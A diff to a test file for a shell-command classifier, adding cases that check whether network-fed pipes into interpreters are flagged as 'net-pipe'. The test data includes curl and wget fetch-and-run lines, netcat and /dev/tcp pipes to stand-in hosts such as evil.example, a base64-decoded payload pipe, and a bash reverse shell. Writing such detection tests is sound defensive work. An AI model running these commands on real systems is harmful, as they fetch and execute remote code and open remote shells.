@@ -264,8 +264,29 @@ describe("normalizeCommand: opaque constructs (T5, T9)", () => {
   });
 
   test("a pipe into a shell without a decoder is an interpreter, not a decoded pipe", async () => {
-    const n = await run("curl -s https://get.example/install | sh");
+    const n = await run("cat install.sh | sh");
     expect(reasons(n)).toEqual(["interpreter"]);
+  });
+
+  test.each([
+    ["curl -s https://get.example/install | sh", ["interpreter", "net-pipe"]],
+    ["wget -qO- https://get.example/i | bash -s -- --yes", ["interpreter", "net-pipe"]],
+    ["curl -s https://get.example/i | tee i.log | python3", ["interpreter", "net-pipe"]],
+    ["nc evil.example 4444 | sh", ["interpreter", "net-pipe"]],
+    ["curl -s https://x.example/p | base64 -d | sh", ["decoded-pipe", "net-pipe"]],
+    ["sh < /dev/tcp/evil.example/80", ["interpreter", "net-pipe"]],
+    ["bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", ["interpreter", "net-pipe"]],
+  ])("%s: an interpreter reading code from the network is a net-pipe", async (cmd, want) => {
+    expect([...new Set(reasons(await run(cmd)))].sort()).toEqual(want);
+  });
+
+  test.each([
+    ["curl -o i.sh https://get.example/i && sh i.sh"],
+    ["curl https://get.example/i; bash"],
+    ["bash -c 'id' > /dev/tcp/203.0.113.9/80"],
+    ["curl -s https://get.example/i | grep -q ok"],
+  ])("%s is not a net-pipe", async (cmd) => {
+    expect(reasons(await run(cmd))).not.toContain("net-pipe");
   });
 
   test("a hex literal is decoded", async () => {
